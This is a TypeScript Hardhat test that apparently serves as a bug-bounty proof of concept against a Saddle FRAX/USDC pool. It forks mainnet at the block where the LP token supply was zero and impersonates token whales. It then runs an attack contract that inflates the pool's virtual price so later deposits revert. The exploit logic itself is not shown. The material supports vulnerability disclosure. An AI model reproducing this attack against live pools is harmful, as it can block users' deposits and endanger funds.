import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import chai from "chai"
import dotenv from "dotenv"
import { solidity } from "ethereum-waffle"
import { BigNumber } from "ethers"
import { deployments, network } from "hardhat"
import {
  GenericERC20,
  LPToken,
  SaddlePOC,
  SwapFlashLoan,
} from "../../build/typechain/"
import { ALCHEMY_BASE_URL, CHAIN_ID } from "../../utils/network"
import {
  BIG_NUMBER_1E18,
  impersonateAccount,
  MAX_UINT256,
  setEtherBalance,
} from "../testUtils"

dotenv.config()
chai.use(solidity)
const { expect } = chai

describe("Proof of concept for reported immunefi bug", () => {
  const FRAX_BP_POOL_ADDRESS = "0x13Cc34Aa8037f722405285AD2C82FE570bfa2bdc"
  const FRAX_BP_LPTOKEN_ADDRESS = "0x927E6f04609A45B107C789aF34BA90Ebbf479f7f"
  const FRAX_ADDRESS = "0x853d955acef822db058eb8505911ed77f175b99e"
  const USDC_ADDRESS = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"

  let signers: Array<SignerWithAddress>
  let pocContract: SaddlePOC
  let fraxBPContract: SwapFlashLoan
  let fraxBPLPTokenContract: LPToken
  let usdcContract: GenericERC20
  let fraxContract: GenericERC20

  before(async () => {
    // Fork mainnet to the block when saddleUSDCUSDTFrax LP token totalSupply was 0
    await network.provider.request({
      method: "hardhat_reset",
      params: [
        {
          forking: {
            jsonRpcUrl:
              ALCHEMY_BASE_URL[CHAIN_ID.MAINNET] + process.env.ALCHEMY_API_KEY,
            blockNumber: 15035845,
          },
        },
      ],
    })
  })

  const setupTest = deployments.createFixture(
    async ({ deployments, ethers }) => {
      const { get, deploy } = deployments

      // Do not deploy any additional contract via fixture
      // No need since we are forking mainnet
      await deployments.fixture([])
      signers = await ethers.getSigners()

      // Deploy POC contract with 100 ether
      await deploy("SaddlePOC", {
        from: signers[0].address,
        value: ethers.utils.parseEther("100"),
      })
      pocContract = await ethers.getContract("SaddlePOC")

      // Since we are forking within the hardhat test script,
      // we cannot rely on getContract by deployment name.
      fraxBPContract = await ethers.getContractAt(
        "SwapFlashLoan",
        FRAX_BP_POOL_ADDRESS,
      )
      fraxBPLPTokenContract = await ethers.getContractAt(
        "LPToken",
        FRAX_BP_LPTOKEN_ADDRESS,
      )
      usdcContract = await ethers.getContractAt("GenericERC20", USDC_ADDRESS)
      fraxContract = await ethers.getContractAt("GenericERC20", FRAX_ADDRESS)

      expect(await fraxBPLPTokenContract.totalSupply()).to.eq(0)

      // Fund signer[1] with some USDC and FRAX by transfering from whales
      // Give the deployer tokens from each token holder for testing
      const tokenToAccountsMap = {
        [FRAX_ADDRESS]: ["0xd632f22692fac7611d2aa1c0d552930d43caed3b"],
        [USDC_ADDRESS]: ["0x0a59649758aa4d66e25f08dd01271e891fe52199"],
      }

      for (const [tokenAddress, holders] of Object.entries(
        tokenToAccountsMap,
      )) {
        const token: GenericERC20 = await ethers.getContractAt(
          "GenericERC20",
          tokenAddress,
        )
        await Promise.all(
          holders.map(async (holder) => {
            const balance = await token.balanceOf(holder)
            await setEtherBalance(holder, 1e20)
            await token
              .connect(await impersonateAccount(holder))
              .transfer(signers[1].address, balance)
          }),
        )
      }
    },
  )

  beforeEach(async () => {
    await setupTest()
  })

  describe("POC contract attacks an empty pool", () => {
    it("LPToken cannot be minted after attack", async () => {
      await pocContract.attack()
      // Total supply is 1 wei
      expect(await fraxBPLPTokenContract.totalSupply()).to.eq(1)
      // Because flashloan occured while total supply was at lowest possible unit,
      // the value of 1e18 LP token becomes very high.
      expect(await fraxBPContract.getVirtualPrice()).to.eq(
        "9999990000999990011947000000000000000000",
      )

      // Since value of smallest unit of LP token is higher than the deposit amount,
      // the expected amount of LP token to be minted is 0
      const expectedAmount = await fraxBPContract.calculateTokenAmount(
        [BigNumber.from(10).pow(6), BIG_NUMBER_1E18],
        true,
      )
      expect(expectedAmount).to.eq(0)

      // This implies actual add liquidity call will also fail since 0 amount cannot be minted.
      // User tries to add small amount of liquidity to the pool
      await usdcContract
        .connect(signers[1])
        .approve(fraxBPContract.address, MAX_UINT256)
      await fraxContract
        .connect(signers[1])
        .approve(fraxBPContract.address, MAX_UINT256)

      await expect(
        fraxBPContract
          .connect(signers[1])
          .addLiquidity(
            [BigNumber.from(10).pow(6), BIG_NUMBER_1E18],
            0,
            MAX_UINT256,
          ),
      ).to.be.revertedWith("LPToken: cannot mint 0")
    })
  })
})
